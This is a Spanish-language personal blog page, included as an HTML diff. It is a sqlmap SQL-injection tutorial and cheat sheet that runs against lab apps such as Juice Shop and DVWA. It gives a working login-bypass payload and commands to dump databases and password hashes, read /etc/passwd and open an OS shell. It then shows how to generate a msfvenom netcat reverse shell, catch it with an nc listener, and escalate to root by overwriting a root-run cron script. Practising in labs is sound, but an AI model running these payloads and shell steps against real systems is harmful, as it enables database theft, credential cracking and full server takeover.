@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="es">
+
+
+
+
+
+<head>
+  <meta property="og:url" content="https://imlauera.github.io/post/sqlmap/">
+  <meta property="og:site_name" content="Imlauer">
+  <meta property="og:title" content="Ataques de SQL Injection en formularios con Sqlmap">
+  <meta property="og:description" content="git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev cd sqlmap-dev Podemos ver que se está realizando una solicitud POST a este punto final:
+python3 sqlmap.py -u &#39;http://localhost:3000/rest/user/login&#39; --data=&#34;email=test@test.com&amp;password=test&#34; --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=&#39;sqlite&#39; --technique=B -u es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte
+--data es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &amp;
+--level 5 y --risk 3 son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.">
+  <meta property="og:locale" content="es_es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-08-05T00:49:00-03:00">
+    <meta property="article:modified_time" content="2024-08-05T00:49:00-03:00">
+    <meta property="article:tag" content="Hacking">
+    <meta property="article:tag" content="Sqlmap">
+
+  
+  <meta itemprop="name" content="Ataques de SQL Injection en formularios con Sqlmap">
+  <meta itemprop="description" content="git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev cd sqlmap-dev Podemos ver que se está realizando una solicitud POST a este punto final:
+python3 sqlmap.py -u &#39;http://localhost:3000/rest/user/login&#39; --data=&#34;email=test@test.com&amp;password=test&#34; --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=&#39;sqlite&#39; --technique=B -u es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte
+--data es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &amp;
+--level 5 y --risk 3 son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.">
+  <meta itemprop="datePublished" content="2024-08-05T00:49:00-03:00">
+  <meta itemprop="dateModified" content="2024-08-05T00:49:00-03:00">
+  <meta itemprop="wordCount" content="1309">
+  <meta itemprop="keywords" content="Hacking,Sqlmap">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Ataques de SQL Injection en formularios con Sqlmap">
+  <meta name="twitter:description" content="git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev cd sqlmap-dev Podemos ver que se está realizando una solicitud POST a este punto final:
+python3 sqlmap.py -u &#39;http://localhost:3000/rest/user/login&#39; --data=&#34;email=test@test.com&amp;password=test&#34; --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=&#39;sqlite&#39; --technique=B -u es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte
+--data es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &amp;
+--level 5 y --risk 3 son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.">
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>
+    
+    Ataques de SQL Injection en formularios con Sqlmap
+    
+  </title>
+  <link rel="stylesheet" href='https://imlauera.github.io/css/site.min.css'>
+  <link rel="canonical" href="https://imlauera.github.io/post/sqlmap/">
+  <link rel="alternate" type="application/rss&#43;xml" href="https://imlauera.github.io/index.xml" title="Imlauer">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="no-referrer">
+  <meta name="author" content="Imlauer.">
+  <meta name="description" content="git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+Podemos ver que se está realizando una solicitud POST a este punto final:
+python3 sqlmap.py -u &#39;http://localhost:3000/rest/user/login&#39; --data=&#34;email=test@test.com&amp;password=test&#34; --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=&#39;sqlite&#39; --technique=B
+
+
+-u es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte
+
+
+--data es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &amp;
+
+
+--level 5 y --risk 3 son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.">
+</head>
+<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
+  <div class="navbar-brand">
+    <a class="navbar-item" href="https://imlauera.github.io/">
+      <figure class="image">
+        <img alt="" class="is-rounded" src="/img/memememe.jpg">
+      </figure>
+    </a>
+    <a class="navbar-item" href="https://imlauera.github.io/">
+      Imlauer
+    </a>
+    <a class="navbar-item" href="/acerca/">
+      Acerca de Mi
+    </a>
+  </div>
+  
+  
+</nav>
+
+  <section>
+    <section class='hero is-small is-link is-fullwidth'>
+      <div class="hero-body">
+<div class="container">
+  <h1 class="title">
+    Ataques de SQL Injection en formularios con Sqlmap
+  </h1>
+  <h2 class="subtitle">
+    <time datetime='2024-08-05T00:49:00-03:00'>
+      August 05, 2024
+    </time>
+    
+    <br>
+    
+    
+    
+    <a class="tag is-info" href="https://imlauera.github.io/tags/hacking/">Hacking</a>
+    
+    
+    
+    
+    <a class="tag is-info" href="https://imlauera.github.io/tags/sqlmap/">Sqlmap</a>
+    
+    
+    
+  </h2>
+</div>
+
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+<div class="content is-medium">
+  <pre tabindex="0"><code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+</code></pre><p>Podemos ver que se está realizando una solicitud POST a este punto final:</p>
+<pre tabindex="0"><code>python3 sqlmap.py -u &#39;http://localhost:3000/rest/user/login&#39; --data=&#34;email=test@test.com&amp;password=test&#34; --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=&#39;sqlite&#39; --technique=B
+</code></pre><ul>
+<li>
+<p><code>-u</code> es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte</p>
+</li>
+<li>
+<p><code>--data</code> es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &amp;</p>
+</li>
+<li>
+<p><code>--level 5</code> y <code>--risk 3</code> son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.</p>
+</li>
+<li>
+<p><code>-f</code> y <code>--banner</code> son opciones de toma de huellas digitales que se utilizan para enumerar nuestro objetivo e intentar recopilar datos útiles.</p>
+</li>
+<li>
+<p><code>--ignore-code 401</code> se usa porque cuando sqlmap envía solicitudes con payloads de sqli al destino, inevitablemente usará credenciales no válidas, lo que resultará en una respuesta HTTP 401 (401 no está autorizado) de la aplicación de destino&hellip; el problema es que sqlmap dejará de enviar solicitudes a la primera señal de respuestas 401 a menos que proporcionemos este indicador. Ya sabemos que las solicitudes resultarán en 401, por lo que no nos importa y queremos ignorarlas.</p>
+</li>
+<li>
+<p><code>--dbms='sqlite'</code> si ya sabe sin lugar a dudas que su aplicación de destino está usando un determinado sistema de administración de bases de datos, como sabemos aquí que la tienda de jugos usa sqlite (generalmente puede resolver esto con un poco de investigación inicial) podemos especificarlo, lo que ayudará a sqlmap a reducir la cantidad de solicitudes que debe enviar y acelerará nuestras pruebas. Si no sabe qué es el DBMS back-end, puede omitir esto y sqlmap lo resolverá.</p>
+</li>
+<li>
+<p><code>--technique=B</code> es decirle a sqlmap que solo use payloads ciegas basadas en booleanos para realizar pruebas en lugar de incluir todas sus otras técnicas. La única razón por la que hago esto es para acelerar las cosas, ya que sé que esta aplicación es susceptible a esta técnica. De lo contrario, puede dejar que sqlmap use todas sus técnicas disponibles para aumentar sus probabilidades de encontrar algo.</p>
+</li>
+</ul>
+<h3 id="el-payload-sqli-exitoso">El payload SQLi exitoso</h3>
+<p>Una cosa más que haré antes de terminar es observar el payload SQLi exitoso que encontró sqlmap:</p>
+<pre tabindex="0"><code>Parameter: email (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: email=test@test.com&#39; OR NOT 1120=1120-- BGqV&amp;password=test
+</code></pre><p>El parámetro vulnerable es el parámetro de correo electrónico, el tipo de inyección exitosa es <code>OR boolean-based blind</code> y el payload es el siguiente:</p>
+<pre tabindex="0"><code>&#39; OR NOT 1120=1120-- BGqV
+</code></pre><p>Lo interesante de esto es que técnicamente este payload no funciona, pero hay una razón por la que sqlmap se la muestra. Déjame demostrarlo.
+Podemos probar este payload manualmente a través de la página web y mediante ZAP.
+En la página de inicio de sesión, si intentamos enviar esto como nombre de usuario:</p>
+<p><code>test@test.com' OR NOT 1120=1120-- BGqV</code>
+<img src="/img/sql/login.webp" alt="login"></p>
+<p>No obtenemos un inicio de sesión exitoso. Entonces, ¿qué está pasando? ¿Por qué sqlmap dice que es un payload exitoso?</p>
+<p>Hay una razón por la que te enseño cómo revisar el código base de sqlmap.</p>
+<p>Si vamos a <code>/data/xml/payloads/boolean_blind.xml</code> en el código base de sqlmap y buscamos el título del payload (<code>OR boolean-based blind - WHERE or HAVING clause (NOT)</code>), veremos que este payload se compara con la respuesta del segundo payload:</p>
+<pre tabindex="0"><code>&lt;request&gt;
+     &lt;payload&gt;OR NOT [RANDNUM]=[RANDNUM]&lt;/payload&gt;
+&lt;/request&gt;
+&lt;response&gt;
+     &lt;comparison&gt;OR NOT [RANDNUM]=[RANDNUM1]&lt;/comparison&gt;
+&lt;/response&gt;
+</code></pre><p><img src="/img/sql/payload.webp" alt="payload"></p>
+<p>Lo que esto significa es que el primer payload - la que muestra sqlmap:</p>
+<p><code>' OR NOT 1120=1120-- tGvo</code></p>
+<p>En realidad, se está comparando con los resultados de este payload ligeramente modificado:</p>
+<p><code>' OR NOT 1120=-1120-- tGvo</code></p>
+<p>(Observe el número negativo en el segundo payload)</p>
+<p>Debido a que sqlmap obtiene resultados diferentes de la aplicación/base de datos cuando compara estos dos resultados, sabe que los diferentes payloads desencadenan una respuesta diferente de la base de datos, lo que significa que es vulnerable a las inyecciones de SQL. No deberíamos poder manipular consultas SQL de la forma en que lo hace el payload si esta base de datos no es vulnerable a SQLi.</p>
+<p>Entonces, nuestro payload exitosa es en realidad la de comparación, pero esa no es la que nos muestra sqlmap.</p>
+<p>Si utilizamos ese payload de comparación, iniciaremos sesión correctamente a través de la aplicación.</p>
+<p>Nuevamente, también podemos ejecutar esto a través de ZAP.</p>
+<pre tabindex="0"><code>test@test.com&#39; OR NOT 1120=-1120-- tGvo
+</code></pre><p>Obtenemos un inicio de sesión exitoso a pesar de que estas no son credenciales válidas; es porque hemos encontrado un payload de inyección SQL exitoso que engaña a la base de datos haciéndole creer que somos un usuario válido.</p>
+<p><img src="/img/sql/exito.webp" alt="success"></p>
+<p>######## Otro</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--update
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span>
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> --dbs
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> -D database --tables
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> -D database -T table --columns
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> -D database -T table -C field1,field2 --dump
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> -D database -T table --dump
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;URL&#34;</span> -D database --dump-all
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># POST data</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># json ，--data &#34;{&#39;a&#39;:1,&#39;b&#39;:2}&#34; 或者 --data &#39;{&#34;a&#34;:1,&#34;b&#34;:2}&#39;</span>
+</span></span><span style="display:flex;"><span>--data <span style="color:#e6db74">&#34;a=1&amp;b=2&#34;</span>
+</span></span><span style="display:flex;"><span>--cookie <span style="color:#e6db74">&#34;SESSION_ID=xxx;abc=xxx;&#34;</span>
+</span></span><span style="display:flex;"><span>--header <span style="color:#e6db74">&#34;User-Agent: Mozilla/5.0 (Windows NT ...&#34;</span>
+</span></span><span style="display:flex;"><span>-p par1,par2
+</span></span><span style="display:flex;"><span>--skip par1,par2
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># B = boolean-based</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># E = error-based</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># U = union-based</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># S = stacked-queries</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># T = time-based</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Q = inline-queries</span>
+</span></span><span style="display:flex;"><span>--technique BEQU
+</span></span><span style="display:flex;"><span>--union-cols <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --union-values &#34;1,*,3,4,5&#34;</span>
+</span></span><span style="display:flex;"><span>--union-values <span style="color:#e6db74">&#34;1,*,3,4,5&#34;</span>
+</span></span><span style="display:flex;"><span>--prefix <span style="color:#e6db74">&#34;&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>--suffix <span style="color:#e6db74">&#34;-- a&#34;</span>
+</span></span><span style="display:flex;"><span>-v <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>--dbms mysql
+</span></span><span style="display:flex;"><span>--batch
+</span></span><span style="display:flex;"><span>--skip-waf
+</span></span><span style="display:flex;"><span>--risk N
+</span></span><span style="display:flex;"><span>--level N
+</span></span><span style="display:flex;"><span>--forms
+</span></span><span style="display:flex;"><span>-b
+</span></span><span style="display:flex;"><span>--dbs
+</span></span><span style="display:flex;"><span>-D <span style="color:#e6db74">&#34;DB_Name&#34;</span>
+</span></span><span style="display:flex;"><span>--tables
+</span></span><span style="display:flex;"><span>-T <span style="color:#e6db74">&#34;Table_Name&#34;</span>
+</span></span><span style="display:flex;"><span>--columns
+</span></span><span style="display:flex;"><span>-C <span style="color:#e6db74">&#34;account,password&#34;</span>
+</span></span><span style="display:flex;"><span>-X <span style="color:#e6db74">&#34;id,time&#34;</span>
+</span></span><span style="display:flex;"><span>--dump
+</span></span><span style="display:flex;"><span>--dump-all
+</span></span><span style="display:flex;"><span>--is-dba
+</span></span><span style="display:flex;"><span>--passwords
+</span></span><span style="display:flex;"><span>--current-db
+</span></span><span style="display:flex;"><span>--current-user
+</span></span><span style="display:flex;"><span>--file-read <span style="color:#e6db74">&#34;/etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span>--file-write <span style="color:#e6db74">&#34;/your/file/path&#34;</span>
+</span></span><span style="display:flex;"><span>--file-dest <span style="color:#e6db74">&#34;/server/root/path&#34;</span>
+</span></span><span style="display:flex;"><span>--sql-shell
+</span></span><span style="display:flex;"><span>--os-shell
+</span></span><span style="display:flex;"><span>--web-root <span style="color:#e6db74">&#34;/var/www/html/upload&#34;</span>
+</span></span><span style="display:flex;"><span>--text-only
+</span></span><span style="display:flex;"><span>--string <span style="color:#e6db74">&#34;STR&#34;</span>
+</span></span><span style="display:flex;"><span>--skip-urlencode
+</span></span><span style="display:flex;"><span>--no-escape
+</span></span><span style="display:flex;"><span>--time-sec <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>--fresh-queries
+</span></span><span style="display:flex;"><span>--binary-fields column_name
+</span></span><span style="display:flex;"><span>--tamper space2comment,space2hash,space2mssqlhash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python sqlmap.py ... --test-skip<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(MySQL &gt; 5)|(MySQL &gt;= 5)&#39;</span>
+</span></span><span style="display:flex;"><span>python sqlmap.py ... --test-skip<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;MySQL &gt;=? 5&#39;</span>
+</span></span></code></pre></div><p><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">https://hackmd.io/@bttea/sqlmap_common_parameters</a></p>
+<h2 id="otra">Otra</h2>
+<p><a href="https://hackertarget.com/sqlmap-post-request-injection/">https://hackertarget.com/sqlmap-post-request-injection/</a></p>
+<h4 id="interesantes-ataques-con-sqlmap">Interesantes ataques con sqlmap:</h4>
+<p><a href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">https://blog.csdn.net/dzqxwzoe/article/details/132683722</a>
+<a href="https://www.cnblogs.com/insane-Mr-Li/p/10150165.html">https://www.cnblogs.com/insane-Mr-Li/p/10150165.html</a>
+<a href="https://www.cnblogs.com/Sylon/p/11747464.html">https://www.cnblogs.com/Sylon/p/11747464.html</a>
+<a href="https://blog.csdn.net/Breeze_CAT/article/details/80628392">https://blog.csdn.net/Breeze_CAT/article/details/80628392</a>
+<a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap</a></p>
+<h4 id="cheatsheet">cheatsheet</h4>
+<p><a href="https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf">https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf</a></p>
+<p><a href="https://www.binarytides.com/using-sqlmap-with-login-forms/">https://www.binarytides.com/using-sqlmap-with-login-forms/</a>
+<a href="https://www.hackingarticles.in/exploiting-form-based-sql-injection-using-sqlmap/">https://www.hackingarticles.in/exploiting-form-based-sql-injection-using-sqlmap/</a>
+<a href="https://www.cnblogs.com/insane-Mr-Li/p/10150165.html">https://www.cnblogs.com/insane-Mr-Li/p/10150165.html</a></p>
+<p><a href="https://old.reddit.com/r/hackthebox/comments/sato6n/sqlmap_forms/">https://old.reddit.com/r/hackthebox/comments/sato6n/sqlmap_forms/</a></p>
+<pre tabindex="0"><code>sqlmap -u “http://example.com/“ --crawl=1 ---random-agent --batch --forms --threads=5 --level=5 --risk=3
+</code></pre><h1 id="otra-forma">Otra forma</h1>
+<p>Usando Damn Vulnerable Web Application podemos intentar explotar un sql injection</p>
+<p>Instalá docker: <code>sudo apt install -y docker.io</code> <code>sudo usermod -aG docker $USER</code> ahora tenés que desloguearte y volver a ingresar para formar parte del grupo docker.</p>
+<p><code>docker run --rm -it -p 1234:1234 vulnerables/web-dvwa</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://192.168.136.131/sqlmap/mysql/get_int.php?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><ol>
+<li>Identifica los parámetros de prueba (en esta caso id)</li>
+<li>Identifica las técnicas de SQL Injection a usar</li>
+<li>Fingerprint el backend DBMS (recompila información). DBMS=mysql,mariadb, sqlite</li>
+<li>Intenta explotar vulnerabilidades.</li>
+</ol>
+<pre tabindex="0"><code>sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --tables
+
+sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --schema
+
+sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --schema --batch
+
+sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --columns -T users --batch
+
+sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --dump -T users --batch
+
+sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=234&amp;Submit=Submit#&#34; --cookies &#34;PHPSESSID=123; security=low&#34; --passwords
+</code></pre><h3 id="sqlmap-en-formularios">SQLMAP en Formularios</h3>
+<pre tabindex="0"><code>sqlmap -u http://127.0.0.1/login.php --form --dbs --batch
+available databases[2]:
+admin
+information_schema
+
+sqlmap -u http://127.0.0.1/login.php --form -D admin --dump-all --batch
+</code></pre><p><a href="https://crackstation.net">https://crackstation.net</a><br>
+<a href="https://hashkiller.io">https://hashkiller.io</a> <code>-&gt; hash cracker</code><br>
+<a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p>
+<p>o googleá: md5 decrypt</p>
+<h2 id="para-conseguir-un-reverse-shell-una-vez-que-tuvimos-acceso-con-el-usuario-y-contraseña-obtenida-en-el-paso-anterior-explotamos-otra-vulnerabilidad">Para conseguir un reverse shell una vez que tuvimos acceso con el usuario y contraseña obtenida en el paso anterior explotamos otra vulnerabilidad.</h2>
+<h4 id="php-regular-expression-pattern-exploit">php regular expression pattern exploit</h4>
+<p>Para crear el payload.
+Necesitamos codificarlo con burp suit -&gt; decoder -&gt; as url -&gt; pega el payload y luego ponelo entre <code>system()</code><br>
+<code>sudo msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.0.201 LPORT=4545 -f raw</code><br>
+<code>sudo rlwrap nc -lvp 4545</code>
+Ahora podemos ejecutar cualquier comando como <code>id</code></p>
+<h4 id="para-conseguir-el-acceso-a-root-al-sistema">Para conseguir el acceso a root al sistema:</h4>
+<pre tabindex="0"><code>cat /etc/crontab
+cat /var/www/cronjobs/clearlogs
+ls -la /var/www/cronjobs/
+ls -la /var/www/cmd/
+ls -la /var/www/
+cd /var/www/cmd
+</code></pre><p>Hacemos esto porque logcleared.sh es ejecutado por el usuario root.</p>
+<pre tabindex="0"><code>echo &#34;payload obtenido con el comando msfvenom con el puerto cambiado&#34; &gt; logcleared.sh
+chmod +x logcleared.sh
+sudo rlwrap nc -lvp 4546
+</code></pre><pre tabindex="0"><code>sqlmap -u &#34;URL&#34; --data=&#34;opcion=4&amp;docnro=78979&amp;clave=hola&amp;olvido=0&#34; --random-agent -f --banner --ignore-code 401 --dbms=&#39;mariadb&#39; --technique=B
+</code></pre><p><a href="https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body">https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body</a></p>
+<p>JSON data as body</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: www.example.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;*&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>sqlmap -r sqlrequest.txt --level=5 risk=3 --force-ssl</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--csrf-url <span style="color:#e6db74">&#39;https://studentportal.elfu.org/validator.php&#39;</span> --csrf-token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span>
+</span></span></code></pre></div><p>También podés usar sqlmap en burpsuit está integrado ejecutando el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ sqlmapapi -s -H 127.0.0.1 -p <span style="color:#ae81ff">9090</span>
+</span></span></code></pre></div>
+</div>
+
+
+      </div>
+    </section>
+  </section><script 
+src="/quiz/quizdown.js">
+</script>
+<script 
+src="/quiz/quizdownKatex.js">
+</script>
+<script 
+src="/quiz/quizdownHighlight.js">
+</script>
+<script>quizdown.register(quizdownHighlight).register(quizdownKatex).init()</script> 
+<footer class="footer">
+  <div class="content has-text-centered">
+    
+    
+    <p>
+      
+      <a class="" href="https://imlauera.github.io/index.xml" target="_blank">
+        <span>
+          RSS
+        </span>
+      </a>
+      
+      | <a href="https://imlauera.github.io" target="_blank">Andres Imlauer.</a> 
+
+      
+      
+    </p>
+    
+  </div>
+
+
+
+
+<script type="text/javascript"
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({ tex2jax: {inlineMath: [["$","$"],["\\(","\\)"]]} })
+</script>
+</footer>
+
+
+</body>
+</html>
